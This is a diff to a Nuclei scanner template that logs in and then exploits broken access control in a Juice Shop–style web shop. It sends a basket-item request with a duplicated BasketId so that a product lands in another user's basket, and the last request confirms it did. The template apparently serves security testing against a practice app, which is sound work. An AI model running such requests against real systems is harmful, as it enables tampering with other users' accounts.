@@ -2,16 +2,19 @@ id: basket-items-auth-flow_broken-access-control
 
 info:
   name: Basket Items API with Auth Flow
-  author: your_name
+  author: baothang
   severity: info
   description: |
     Kiểm tra API Basket Items với quá trình đăng nhập để lấy token và sử dụng trong request GET/POST.
+
+flow: |
+  http(1) && http(2) && http(3) && http(4)
 
 requests:
   - raw:
       - |
         POST /rest/user/login HTTP/1.1
-        Host: 127.0.0.1:3000
+        Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
         Accept: application/json, text/plain, */*
         Content-Type: application/json
@@ -29,7 +32,7 @@ requests:
   - raw:
       - |
         GET /rest/basket/6 HTTP/1.1
-        Host: 127.0.0.1:3000
+        Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
         Accept: application/json, text/plain, */*
         Authorization: Bearer {{token}}
@@ -53,7 +56,7 @@ requests:
   - raw:
       - |
         POST /api/BasketItems/ HTTP/1.1
-        Host: 127.0.0.1:3000
+        Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
         Accept: application/json, text/plain, */*
         Content-Type: application/json
@@ -61,21 +64,32 @@ requests:
         Cookie: language=en; token={{token}}
 
         {   
-            "ProductId":1,
+            "ProductId":30,
             "BasketId":"{{id}}",
-            "BasketId":"10",
-            "quantity":1
+            "quantity":1,
+            "BasketId":"1"           
         }
 
     matchers-condition: and
     matchers:
       - type: status
         status:
-          - 500
+          - 200
               
-      - type: word
-        part: body
-        words:
-          - "SQLITE"
 
+  - raw:
+      - |
+        GET /rest/basket/1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Authorization: Bearer {{token}}
+        Cookie: language=en; token={{token}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(tolower(body), "\"id\":30") && contains(tolower(body), "\"name\":\"carrot juice (1000ml)\"")'
+        condition: and
+        
 
